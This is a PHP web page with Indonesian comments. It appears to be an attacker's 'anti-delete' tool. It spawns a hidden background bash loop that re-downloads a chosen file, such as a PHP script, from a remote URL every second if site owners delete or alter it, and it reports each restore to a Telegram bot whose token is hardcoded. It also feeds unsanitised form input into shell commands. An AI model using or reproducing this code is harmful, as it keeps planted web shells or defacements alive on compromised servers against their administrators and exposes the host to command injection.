<?php
// Fungsi untuk membuat bash script yang akan menjalankan wget setiap detik jika file terhapus atau diubah
function setupBashScript($url, $fileName, $web, $bot_token, $chat_id) {
    // Mendapatkan path direktori tempat script diletakkan
    $currentDir = __DIR__;
    
    // Pastikan direktori tujuan memiliki hak akses yang benar
    if (!is_writable($currentDir)) {
        echo "Direktori tidak dapat ditulisi. Pastikan memiliki hak akses tulis.";
        return;
    }
    
    // Membuat bash script untuk menjalankan wget setiap detik jika file terhapus atau kontennya berubah
     $bashScript = <<<BASH
                 #!/bin/bash
                 function send_telegram_message() {
                   local text="\$1"
                   curl -s -X POST "https://api.telegram.org/bot${bot_token}/sendMessage" \\
                        -d "chat_id=${chat_id}" \\
                        -d "text=\${text}"
                 }
                 
                 originalHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')
                 while true; do
                   if [ ! -f '$currentDir/$fileName' ]; then
                     send_telegram_message "File $fileName pada $web tidak ditemukan. Mendownload..."
                     /usr/bin/wget -O '$currentDir/$fileName' '$url' > /dev/null 2>&1
                     send_telegram_message "File berhasil didownload. akses di $web/$currentDir/$fileName"
                     originalHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')
                   else
                     currentHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')
                     if [ \"\$originalHash\" != \"\$currentHash\" ]; then
                       send_telegram_message "File $fileName pada $web telah diubah. Mengembalikan ke versi asli..."
                       /usr/bin/wget -O '$currentDir/$fileName' '$url' > /dev/null 2>&1
                       send_telegram_message "File berhasil didownload. akses di $web/$currentDir/$fileName"
                       originalHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')
                     else
                       echo "File $fileName pada $web tidak berubah. Tidak mendownload ulang."
                     fi
                   fi
                   sleep 1
                 done
                 BASH;

    // Simpan bash script di direktori temporer
    $bashFilePath = "/tmp/wget_script_$fileName.sh";
    file_put_contents($bashFilePath, $bashScript);

    // Memberi izin eksekusi ke bash script
    chmod($bashFilePath, 0755);

    // Menjalankan bash script di latar belakang menggunakan nohup
    exec("nohup bash $bashFilePath $web > /dev/null 2>&1 &");

    echo "Bash script telah dibuat untuk menjalankan wget setiap detik untuk URL: $url dan file: $fileName.\n";
}

// Fungsi untuk menghentikan bash script
function removeBashScript($fileName) {
    // Menghentikan semua proses wget_script yang berjalan di latar belakang
    exec("pkill -f wget_script_$fileName.sh");
    echo "Bash script dan proses wget untuk file $fileName dihentikan.\n";
}

// Jika pengguna menekan tombol "Start", jalankan bash script
if (isset($_POST['start'])) {
    $url = $_POST['url'];
    $web = $_POST['web'];
    $bot_token = '7513781790:AAFC8T_sYrEM1sgIoqWzcBfjSE5Md5MrUYI';
    $chat_id = '6116824863';
    $fileName = $_POST['filename'];
    setupBashScript($url, $fileName, $web, $bot_token, $chat_id);
}

// Jika pengguna menekan tombol "Stop", hentikan bash script
if (isset($_POST['stop'])) {
    $fileName = $_POST['filename'];
    removeBashScript($fileName);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Wget File Creator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #4b79a1, #283e51);
            color: white;
            text-align: center;
            margin-top: 100px;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 8px;
            display: inline-block;
        }
        input[type="text"] {
            padding: 10px;
            border: none;
            border-radius: 4px;
            margin: 10px;
            width: 300px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            border: none;
            background-color: #4CAF50;
            color: white;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Simple Wget File Creator</h1>
        <p>Masukkan URL dan nama file yang ingin dibuat:</p>
        <form method="post">
            <input type="text" name="url" placeholder="Masukkan URL" required>
            <br>
            <input type="text" name="filename" placeholder="Masukkan nama file (contoh: myfile.html atau script.php)" required>
            <br>
            <input type="text" name="web" placeholder="masukan url web" required>
            <br>
            <input type="submit" name="start" value="Start">
            <input type="submit" name="stop" value="Stop">
        </form>
    </div>
</body>
</html>
